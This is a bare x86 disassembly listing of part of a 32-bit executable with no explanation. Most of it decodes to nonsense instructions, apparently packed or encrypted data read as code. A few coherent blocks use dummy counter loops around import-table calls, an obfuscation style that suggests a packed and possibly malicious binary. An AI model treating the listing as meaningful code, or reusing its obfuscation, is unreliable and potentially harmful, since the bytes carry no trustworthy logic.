  40ebee:	inc    edx
  40ebef:	mov    eax,ds:0xe8487434
  40ebf4:	push   cs
  40ebf5:	aad    0xd
  40ebf7:	dec    ecx
  40ebf8:	adc    DWORD PTR [esi+0x5811fff5],ecx
  40ebfe:	stos   BYTE PTR es:[edi],al
  40ebff:	les    eax,FWORD PTR [edi]
  40ec01:	pop    es
  40ec02:	push   ds
  40ec03:	aaa    
  40ec04:	dec    ecx
  40ec05:	mov    cl,0x42
  40ec07:	pop    esp
  40ec08:	add    al,0xe1
  40ec0a:	fwait
  40ec0b:	icebp  
  40ec0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec0d:	dec    esp
  40ec0e:	mov    bh,0xc6
  40ec10:	mov    eax,0xc7621560
  40ec15:	in     eax,dx
  40ec16:	in     eax,dx
  40ec17:	or     ch,BYTE PTR [eax-0x52]
  40ec1a:	add    al,0xa3
  40ec1c:	addr16 dec edx
  40ec1e:	push   ebx
  40ec1f:	mov    dl,dl
  40ec21:	jge    0x40ec48
  40ec23:	add    DWORD PTR [eax],edi
  40ec25:	inc    ebp
  40ec26:	jo     0x40ec77
  40ec28:	sti    
  40ec29:	mov    ch,0x1e
  40ec2b:	fisub  DWORD PTR es:0xc6d5d5c6
  40ec32:	sbb    al,0xf8
  40ec34:	sub    BYTE PTR [esi+0x24],dl
  40ec37:	sbb    cl,BYTE PTR [edi]
  40ec39:	nop
  40ec3a:	pop    ss
  40ec3b:	test   ebx,esp
  40ec3d:	leave  
  40ec3e:	int3   
  40ec3f:	inc    esp
  40ec40:	xlat   BYTE PTR ds:[ebx]
  40ec41:	daa    
  40ec42:	jno    0x40ec1b
  40ec44:	xor    DWORD PTR [ebp-0x3d5e04af],edi
  40ec4a:	cli    
  40ec4b:	pop    edi
  40ec4c:	ret    0x8a09
  40ec4f:	push   ds
  40ec50:	mov    cl,0xa1
  40ec52:	das    
  40ec53:	(bad)  
  40ec54:	and    eax,0x614d723f
  40ec59:	jns    0x40ec8e
  40ec5b:	mul    DWORD PTR [eax]
  40ec5d:	fiadd  WORD PTR [eax]
  40ec5f:	mov    ds:0xc436c07f,al
  40ec64:	repz sub al,cl
  40ec67:	and    DWORD PTR [ebx-0x3e6247b3],esp
  40ec6d:	pop    esi
  40ec6e:	loope  0x40eca4
  40ec70:	xchg   edi,eax
  40ec71:	out    0x66,al
  40ec73:	push   ecx
  40ec74:	ss out dx,al
  40ec76:	sbb    DWORD PTR [edi+0x4f19d0e3],esp
  40ec7c:	sti    
  40ec7d:	jge    0x40eca5
  40ec7f:	cli    
  40ec80:	cwde   
  40ec81:	ror    DWORD PTR [edx-0x5e],0x77
  40ec85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec86:	xor    eax,0x37327647
  40ec8b:	test   eax,0xdffc4e27
  40ec90:	std    
  40ec91:	out    0xf6,eax
  40ec93:	or     BYTE PTR ds:[eax-0x1a],ah
  40ec97:	xor    ch,bh
  40ec99:	mov    edx,DWORD PTR [ebp+0x8]
  40ec9c:	or     ecx,DWORD PTR ds:0x42a77d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	dec    esp
  40eda0:	aam    0x99
  40eda2:	daa    
  40eda3:	popa   
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	test   BYTE PTR [ecx+0x7af40b30],dh
  40edb1:	test   al,0xa8
  40edb3:	or     ch,al
  40edb5:	jg     0x40ed4e
  40edb7:	ss loop 0x40ee34
  40edba:	cmp    dh,BYTE PTR [edi-0x5df09290]
  40edc0:	ror    eax,cl
  40edc2:	int    0xa
  40edc4:	rcr    ch,cl
  40edc6:	xor    bl,BYTE PTR [esp+edi*2]
  40edc9:	jmp    0xec74d096
  40edce:	inc    esp
  40edcf:	repz inc eax
  40edd1:	popa   
  40edd2:	out    0xdf,al
  40edd4:	mov    DWORD PTR [ebx],edi
  40edd6:	pop    es
  40edd7:	rcr    edx,1
  40edd9:	fisubr WORD PTR [esi-0x397d05c7]
  40eddf:	mov    ch,0x15
  40ede1:	cmc    
  40ede2:	nop
  40ede3:	cmp    BYTE PTR ds:0x471c9545,0x0
  40edea:	test   eax,0x2038f281
  40edef:	push   edi
  40edf0:	iret   
  40edf1:	pop    eax
  40edf2:	push   esp
  40edf3:	mov    al,ds:0xcae79652
  40edf8:	xchg   esi,eax
  40edf9:	scas   eax,DWORD PTR es:[edi]
  40edfa:	sbb    ecx,0xffffffcc
  40edfd:	adc    BYTE PTR [edx-0x4e96fc0a],al
  40ee03:	or     eax,DWORD PTR gs:0x72ec3ce0
  40ee0a:	ja     0x40ee43
  40ee0c:	out    0x6d,eax
  40ee0e:	std    
  40ee0f:	out    dx,al
  40ee10:	push   edx
  40ee11:	js     0x40edfb
  40ee13:	test   eax,0x606f1133
  40ee18:	jmp    0x40ee78
  40ee1a:	enter  0xb9ea,0x60
  40ee1e:	aaa    
  40ee1f:	and    eax,0x61812501
  40ee24:	push   esp
  40ee25:	xchg   BYTE PTR [esi+ebx*8+0x2c],al
  40ee29:	pop    esi
  40ee2a:	hlt    
  40ee2b:	add    ebx,ecx
  40ee2d:	and    ah,ah
  40ee2f:	inc    eax
  40ee30:	xor    al,0x44
  40ee32:	test   eax,0xa56d76bf
  40ee37:	inc    edx
  40ee38:	pop    ecx
  40ee39:	inc    esi
  40ee3a:	jecxz  0x40ee45
  40ee3c:	jl     0x40ee39
  40ee3e:	pop    edx
  40ee3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee40:	fimul  DWORD PTR [eax+0x58]
  40ee43:	scas   eax,DWORD PTR es:[edi]
  40ee44:	outs   dx,BYTE PTR ds:[esi]
  40ee45:	mov    esp,0x55b9314a
  40ee4a:	push   esp
  40ee4b:	and    cl,dl
  40ee4d:	mov    edx,0x48e740f6
  40ee52:	mov    ds:0xc815d45,al
  40ee57:	sub    BYTE PTR [ebp+0x6b],al
  40ee5a:	mov    ebp,0x77796d35
  40ee5f:	and    ch,BYTE PTR [esi-0x29]
  40ee62:	jle    0x40ee46
  40ee64:	adc    ebp,DWORD PTR [ebx+eax*2]
  40ee67:	or     ebp,esp
  40ee69:	jmp    esi
  40ee6b:	jae    0x40eebf
  40ee6d:	jle    0x40eea3
  40ee6f:	pop    eax
  40ee70:	push   esi
  40ee71:	mov    ebp,0x2a9d5536
  40ee76:	and    esp,esi
  40ee78:	in     al,dx
  40ee79:	push   ebx
  40ee7a:	retf   0xaf2d
  40ee7d:	nop
  40ee7e:	loope  0x40ee3d
  40ee80:	jo     0x40ee52
  40ee82:	stos   BYTE PTR es:[edi],al
  40ee83:	retf   0x59cb
  40ee86:	mov    WORD PTR [eax],ds
  40ee88:	push   ss
  40ee89:	retf   
  40ee8a:	or     dh,BYTE PTR [eax*2-0x577ac11b]
  40ee91:	in     al,0x7
  40ee93:	push   ss
  40ee94:	cdq    
  40ee95:	mov    al,0xad
  40ee97:	add    DWORD PTR [edi],0x8145dd49
  40ee9d:	arpl   WORD PTR [ebp+edx*1+0x682085a6],si
  40eea4:	sub    bl,BYTE PTR [ecx-0x2b4b1520]
  40eeaa:	push   es
  40eeab:	add    bh,BYTE PTR [edi]
  40eead:	jmp    0xdb85990a
  40eeb2:	test   BYTE PTR [esi+0x62ef9f38],dh
  40eeb8:	sahf   
  40eeb9:	or     BYTE PTR [ecx-0x1a],dh
  40eebc:	xchg   edi,eax
  40eebd:	fcomp  DWORD PTR [ebp+0x53d6ec58]
  40eec3:	jl     0x40ef10
  40eec5:	push   eax
  40eec6:	jbe    0x40ee84
  40eec8:	and    ebp,ebp
  40eeca:	mov    ebx,0x80ff5021
  40eecf:	dec    esp
  40eed0:	nop
  40eed1:	pushf  
  40eed2:	add    al,0x5
  40eed4:	adc    dh,BYTE PTR [ebp-0x5d]
  40eed7:	addr16 loop 0x40ef2b
  40eeda:	pop    es
  40eedb:	adc    BYTE PTR [ecx-0x241e4df8],ch
  40eee1:	femms  
  40eee3:	scas   eax,DWORD PTR es:[edi]
  40eee4:	push   cs
  40eee5:	scas   eax,DWORD PTR es:[edi]
  40eee6:	mov    gs,WORD PTR [ebx]
  40eee8:	in     al,dx
  40eee9:	ds cli 
  40eeeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeec:	mov    al,0x54
  40eeee:	repnz inc esp
  40eef0:	mov    ecx,0x417ae3d4
  40eef5:	inc    edi
  40eef6:	jmp    0x82a9:0xec5899fa
  40eefd:	fcom   DWORD PTR cs:[ebx+0x7c]
  40ef01:	mov    al,0x72
  40ef03:	ins    DWORD PTR es:[edi],dx
  40ef04:	add    dl,BYTE PTR [eax+ebx*2+0x74]
  40ef08:	push   ds
  40ef09:	and    eax,0xcf4761b5
  40ef0e:	cld    
  40ef0f:	in     eax,dx
  40ef10:	xchg   ecx,eax
  40ef11:	fs inc edx
  40ef13:	push   esp
  40ef14:	repz sbb al,0x9e
  40ef17:	xor    esp,0x5decb5a3
  40ef1d:	lods   eax,DWORD PTR ds:[esi]
  40ef1e:	inc    eax
  40ef1f:	(bad)
  40ef23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef24:	add    DWORD PTR [ebp-0x59a7a4f8],ebx
  40ef2a:	mov    ds:0xf5cb31bb,eax
  40ef2f:	sbb    eax,0x94e3ac61
  40ef34:	iret   
  40ef35:	cmp    esi,DWORD PTR [esp+ebp*1-0x4f]
  40ef39:	pushf  
  40ef3a:	imul   ecx,DWORD PTR [edx-0x3703d95d],0xbccfd6aa
  40ef44:	xchg   esi,eax
  40ef45:	dec    edi
  40ef46:	jl     0x40ef3d
  40ef48:	lahf   
  40ef49:	dec    edi
  40ef4a:	das    
  40ef4b:	gs pop esp
  40ef4d:	je     0x40ef30
  40ef4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef50:	(bad)  
  40ef51:	iret   
  40ef52:	xor    edi,edi
  40ef54:	jb     0x40ef3f
  40ef56:	retf   
  40ef57:	or     BYTE PTR [eax+edi*8-0x438fe510],ah
  40ef5e:	aaa    
  40ef5f:	dec    esi
  40ef60:	sub    eax,0x2b1b8dea
  40ef65:	(bad)  
  40ef66:	dec    ecx
  40ef67:	xchg   BYTE PTR [ecx],dl
  40ef69:	sub    dh,BYTE PTR [eax+0x468e3064]
  40ef6f:	repnz mov ecx,0xe86cdf41
  40ef75:	push   edx
  40ef76:	ja     0x40efd5
  40ef78:	add    edi,0x3a6d4743
  40ef7e:	xchg   DWORD PTR [esi+0xf],eax
  40ef81:	push   ebp
  40ef82:	mov    ch,0x40
  40ef84:	je     0x40f002
  40ef86:	sbb    al,0x77
  40ef88:	push   ebx
  40ef89:	sar    dh,0x71
  40ef8c:	lods   eax,DWORD PTR ds:[esi]
  40ef8d:	jns    0x40ef64
  40ef8f:	dec    ebx
  40ef90:	(bad)  
  40ef91:	jle    0x40ef6f
  40ef93:	sbb    al,0xb3
  40ef95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef96:	aas    
  40ef97:	cmp    DWORD PTR [ecx+0x2c],edx
  40ef9a:	add    al,0x42
  40ef9c:	mov    DWORD PTR [eax-0x23],esp
  40ef9f:	mov    al,BYTE PTR [ebx]
  40efa1:	fst    QWORD PTR [ecx-0x3c622efb]
  40efa7:	fld    DWORD PTR [eax-0x20]
  40efaa:	mov    ch,0xb4
  40efac:	adc    dl,BYTE PTR [esi]
  40efae:	daa    
  40efaf:	popa   
  40efb0:	aaa    
  40efb1:	add    al,0x9d
  40efb3:	vdivss xmm1,xmm3,DWORD PTR [esi-0x66]
  40efb8:	cs sbb eax,0x21559d91
  40efbe:	cli    
  40efbf:	enter  0xaa3a,0xa3
  40efc3:	cli    
  40efc4:	outs   dx,BYTE PTR ds:[esi]
  40efc5:	adc    ebx,DWORD PTR [edi+0x1]
  40efc8:	pop    esi
  40efc9:	and    eax,eax
  40efcb:	add    al,0xf3
  40efcd:	dec    ebx
  40efce:	in     eax,dx
  40efcf:	pop    ebp
  40efd0:	pop    ds
  40efd1:	and    BYTE PTR [edx+0x77],al
  40efd4:	popf   
  40efd5:	(bad)  
  40efd6:	in     al,0xb
  40efd8:	call   0x41bd1253
  40efdd:	sub    edx,DWORD PTR [ebx+0x2fbd0874]
  40efe3:	mov    ds,WORD PTR [ebp+0x70880631]
  40efe9:	ret    
  40efea:	imul   ebx,DWORD PTR [edi-0x3f],0xffffffa6
  40efee:	xchg   ebp,eax
  40efef:	in     al,0x7b
  40eff1:	cli    
  40eff2:	jg     0x40f04e
  40eff4:	or     ebx,edi
  40eff6:	out    dx,eax
  40eff7:	fs ja  0x40ef8a
  40effa:	test   DWORD PTR gs:[esi+0x5f373681],ebx
  40f001:	xchg   ecx,eax
  40f002:	gs push ebx
  40f004:	ins    DWORD PTR es:[edi],dx
  40f005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f006:	out    0xaf,eax
  40f008:	(bad)  
  40f009:	cmp    DWORD PTR [esp+eax*1+0x23a94163],esp
  40f010:	je     0x40ef93
  40f012:	xbegin 0x55ca1e3d
  40f018:	clc    
  40f019:	and    DWORD PTR ds:0x42a801,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0x25
  40f0d7:	xchg   esi,eax
  40f0d8:	dec    esp
  40f0d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0da:	into   
  40f0db:	mov    esp,0x7ee57878
  40f0e0:	js     0x40f15a
  40f0e2:	add    BYTE PTR ds:0xa1f3c1e,al
  40f0e8:	gs add dl,cl
  40f0eb:	popw   ds
  40f0ed:	add    esp,ebp
  40f0ef:	xor    ebx,edx
  40f0f1:	retf   0x7cd6
  40f0f4:	stos   DWORD PTR es:[edi],eax
  40f0f5:	hlt    
  40f0f6:	or     ebx,eax
  40f0f8:	xor    DWORD PTR [edi],esp
  40f0fa:	and    DWORD PTR [esi],edx
  40f0fc:	lahf   
  40f0fd:	jnp    0x40f0c4
  40f0ff:	xchg   esp,eax
  40f100:	mov    al,0xac
  40f102:	dec    ecx
  40f103:	aas    
  40f104:	call   0x7dff9b7f
  40f109:	xchg   esi,eax
  40f10a:	fidivr WORD PTR [edx+0x1a]
  40f10d:	jge    0x40f148
  40f10f:	adc    BYTE PTR [ecx],dh
  40f111:	and    al,0xbe
  40f113:	pop    esp
  40f114:	icebp  
  40f115:	dec    eax
  40f116:	test   eax,0x9c4cb112
  40f11b:	jmp    0x39f:0x7c0cbede
  40f122:	push   esp
  40f123:	ss imul ebp,esi,0x15d719bc
  40f12a:	cdq    
  40f12b:	fnstsw WORD PTR [esp+esi*2-0x3c]
  40f12f:	call   DWORD PTR [eax]
  40f131:	mov    dh,al
  40f133:	xchg   BYTE PTR [ebx+0x2f],ah
  40f136:	cmp    esp,DWORD PTR [ebx+ebx*2+0x2ecb531e]
  40f13d:	xchg   BYTE PTR [edi+0x49],dh
  40f140:	xchg   edx,eax
  40f141:	pop    edx
  40f142:	inc    edi
  40f143:	push   ds
  40f144:	addr16 dec ecx
  40f146:	push   0x8bda8c76
  40f14b:	icebp  
  40f14c:	ins    BYTE PTR es:[edi],dx
  40f14d:	in     eax,0x8
  40f14f:	mov    DWORD PTR [esi+0x6f],edi
  40f152:	ins    BYTE PTR es:[edi],dx
  40f153:	(bad)  [edi+0x3f]
  40f156:	rcl    eax,cl
  40f158:	inc    edi
  40f159:	push   0x8
  40f15b:	xchg   ebx,eax
  40f15c:	fdivr  QWORD PTR gs:[ebx]
  40f15f:	adc    esp,DWORD PTR [ebx+ebp*4-0x3d220cb4]
  40f166:	test   BYTE PTR [ecx+0x3525ea57],bl
  40f16c:	ins    BYTE PTR es:[edi],dx
  40f16d:	test   eax,0x6398e869
  40f172:	not    DWORD PTR [esi]
  40f174:	xchg   BYTE PTR [esi-0x7d],al
  40f177:	out    dx,al
  40f178:	test   BYTE PTR [ecx+esi*2],0xd0
  40f17c:	rcr    dh,0xaf
  40f17f:	adc    eax,0x22b5a291
  40f184:	ins    DWORD PTR es:[edi],dx
  40f185:	pop    edi
  40f186:	add    DWORD PTR [edx+0x32],edi
  40f189:	mov    cl,0x3
  40f18b:	sar    DWORD PTR [ebp-0x5f9cf765],1
  40f191:	and    ch,BYTE PTR ds:0x989190d8
  40f197:	cli    
  40f198:	inc    edx
  40f199:	mov    dl,0x61
  40f19b:	ja     0x40f216
  40f19d:	out    0xee,al
  40f19f:	lahf   
  40f1a0:	mov    ds:0x320512f5,eax
  40f1a5:	adc    ah,bh
  40f1a7:	jmp    0x40f1c8
  40f1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1aa:	out    0x3,al
  40f1ac:	and    DWORD PTR [eax-0x59],0xd3a03934
  40f1b3:	(bad)  
  40f1b4:	ror    BYTE PTR [ecx],1
  40f1b6:	ror    BYTE PTR [ecx+0x34],cl
  40f1b9:	xchg   esi,eax
  40f1ba:	jo     0x40f157
  40f1bc:	scas   al,BYTE PTR es:[edi]
  40f1bd:	xchg   DWORD PTR [ecx+0x506cb058],eax
  40f1c3:	or     al,0xc5
  40f1c5:	scas   al,BYTE PTR es:[edi]
  40f1c6:	add    al,0x2e
  40f1c8:	push   0xfffffff0
  40f1ca:	lahf   
  40f1cb:	imul   ecx,edx,0xc2328efe
  40f1d1:	call   0xaad1:0x6cd5052c
  40f1d8:	xlat   BYTE PTR ds:[ebx]
  40f1d9:	sbb    DWORD PTR [eax-0x38],esp
  40f1dc:	and    DWORD PTR [ebx],eax
  40f1de:	sbb    edx,ecx
  40f1e0:	hlt    
  40f1e1:	shl    ecx,1
  40f1e3:	push   ds
  40f1e4:	add    DWORD PTR [edx+0x3d5723b8],edx
  40f1ea:	fs jns 0x40f26b
  40f1ed:	fwait
  40f1ee:	sar    edi,0x59
  40f1f1:	(bad)  
  40f1f2:	sub    DWORD PTR [esi],edi
  40f1f4:	inc    esi
  40f1f5:	das    
  40f1f6:	imul   ecx,DWORD PTR [esi],0xc0396e64
  40f1fc:	mov    WORD PTR [edx-0x54c48fa],ds
  40f202:	pop    ebx
  40f203:	and    al,0xa1
  40f205:	jnp    0x40f1b5
  40f207:	push   esp
  40f208:	int    0x1e
  40f20a:	and    al,0x24
  40f20c:	add    DWORD PTR [eax],edx
  40f20e:	popf   
  40f20f:	jg     0x40f22e
  40f211:	mov    eax,0xa9a7589d
  40f216:	mov    eax,ds:0x744556f4
  40f21b:	push   ebx
  40f21c:	imul   esi,ebx,0xcdcccb9e
  40f222:	fldenv [ebx+0x2ebc8c98]
  40f228:	lds    edx,FWORD PTR [ecx+0x78]
  40f22b:	xor    BYTE PTR [edx+eiz*2-0x3f25ed54],cl
  40f232:	pop    esp
  40f233:	lahf   
  40f234:	push   esi
  40f235:	jmp    DWORD PTR ds:0x5e8101c1
  40f23b:	and    al,0x41
  40f23d:	jo     0x40f245
  40f23f:	xchg   ebp,edi
  40f241:	mov    edx,0x918b98cc
  40f246:	aad    0xf7
  40f248:	retf   
  40f249:	dec    edx
  40f24a:	or     DWORD PTR [ebp-0x6c36528e],ebp
  40f250:	jbe    0x40f25e
  40f252:	push   eax
  40f253:	repz add esi,esi
  40f256:	outs   dx,DWORD PTR ds:[esi]
  40f257:	dec    ecx
  40f258:	cmp    BYTE PTR [ebx-0x1ca74914],0xb
  40f25f:	call   0xda6d:0x7c9af5
  40f266:	sub    BYTE PTR [esi+edi*2+0x4c],dh
  40f26a:	daa    
  40f26b:	mov    fs,ebp
  40f26d:	cmp    al,0x11
  40f26f:	pop    ebx
  40f270:	xchg   esi,eax
  40f271:	dec    ecx
  40f272:	iret   
  40f273:	mov    bh,0x92
  40f275:	cmp    eax,edx
  40f277:	or     al,0xfd
  40f279:	aas    
  40f27a:	pop    eax
  40f27b:	popa   
  40f27c:	xchg   edx,eax
  40f27d:	in     eax,0xbf
  40f27f:	pop    esp
  40f280:	jb     0x40f2d4
  40f282:	push   esi
  40f283:	das    
  40f284:	cmp    eax,0xd71bd3cb
  40f289:	into   
  40f28a:	inc    esp
  40f28b:	xlat   BYTE PTR ds:[ebx]
  40f28c:	xor    BYTE PTR [esi],0x22
  40f28f:	sbb    al,0xd1
  40f291:	lds    edi,FWORD PTR [ecx]
  40f293:	(bad)
  40f296:	pop    esp
  40f297:	fdivr  DWORD PTR [edi-0x5a]
  40f29a:	outs   dx,BYTE PTR ds:[esi]
  40f29b:	retf   
  40f29c:	outs   dx,DWORD PTR ds:[esi]
  40f29d:	dec    edx
  40f29e:	(bad)  
  40f29f:	stos   BYTE PTR es:[edi],al
  40f2a0:	cld    
  40f2a1:	shl    cl,cl
  40f2a3:	jecxz  0x40f2d1
  40f2a5:	fld    TBYTE PTR [ecx+0x3ab031bc]
  40f2ab:	xchg   ecx,eax
  40f2ac:	lods   al,BYTE PTR ds:[esi]
  40f2ad:	jae    0x40f2d1
  40f2af:	leave  
  40f2b0:	mov    ecx,0x38b52fd6
  40f2b5:	push   cs
  40f2b6:	fstp   st(4)
  40f2b8:	xor    DWORD PTR [esi+ebp*1],edx
  40f2bb:	mov    dh,0xbc
  40f2bd:	jae    0x40f2c1
  40f2bf:	ins    DWORD PTR es:[edi],dx
  40f2c0:	ins    BYTE PTR es:[edi],dx
  40f2c1:	jns    0x40f32a
  40f2c3:	mov    edi,0x3cf31e71
  40f2c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2ca:	mov    al,ds:0x494c8a2f
  40f2cf:	repnz sbb DWORD PTR [edx],eax
  40f2d2:	dec    ecx
  40f2d3:	mov    esp,0xd4be4214
  40f2d8:	add    ch,BYTE PTR [ebx]
  40f2da:	sbb    DWORD PTR [ecx-0x5e],edi
  40f2dd:	mov    esp,0xce17e2b7
  40f2e2:	(bad)  
  40f2e3:	popa   
  40f2e4:	imul   ecx,DWORD PTR [eax+eiz*1+0x2e],0xc57a00d3
  40f2ec:	mov    dh,0x18
  40f2ee:	inc    edx
  40f2ef:	inc    ebx
  40f2f0:	in     al,0x39
  40f2f2:	(bad)  
  40f2f4:	outs   dx,DWORD PTR ds:[esi]
  40f2f5:	loopne 0x40f29f
  40f2f7:	fbstp  TBYTE PTR [ebx+ebp*8-0x47e3ca3c]
  40f2fe:	stos   DWORD PTR es:[edi],eax
  40f2ff:	inc    eax
  40f300:	loopne 0x40f2da
  40f302:	test   DWORD PTR es:[esi+ecx*4-0x4872bbd4],0x428515c4
  40f30e:	retf   0x7490
  40f311:	dec    eax
  40f312:	in     al,dx
  40f313:	lds    eax,FWORD PTR [esp+eiz*4]
  40f316:	pop    eax
  40f317:	pop    esi
  40f318:	(bad)  [eax+0x5379c2d3]
  40f31e:	inc    edx
  40f31f:	inc    esi
  40f320:	jmp    0x40f319
  40f322:	retf   
  40f323:	add    al,0x43
  40f325:	sbb    BYTE PTR [ecx+eiz*8],bh
  40f328:	add    eax,0x7535aca5
  40f32d:	jns    0x40f304
  40f32f:	jno    0x40f35e
  40f331:	mov    edi,0xedf8e151
  40f336:	mov    ebx,0x5116ff12
  40f33b:	ret    
  40f33c:	(bad)  [edx+0x4863791e]
  40f342:	ss pusha 
  40f344:	(bad)  
  40f345:	jp     0x40f3ac
  40f347:	(bad)  
  40f348:	dec    esp
  40f34a:	mov    esp,DWORD PTR [edx-0x382efccd]
  40f350:	add    eax,0x42a80d
  40f355:	sbb    eax,0x83000000
  40f35a:	cmp    eax,0x42a80d
  40f35f:	add    BYTE PTR [edi],cl
  40f361:	test   BYTE PTR [ebp+0x0],bl
  40f364:	add    BYTE PTR [eax],al
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
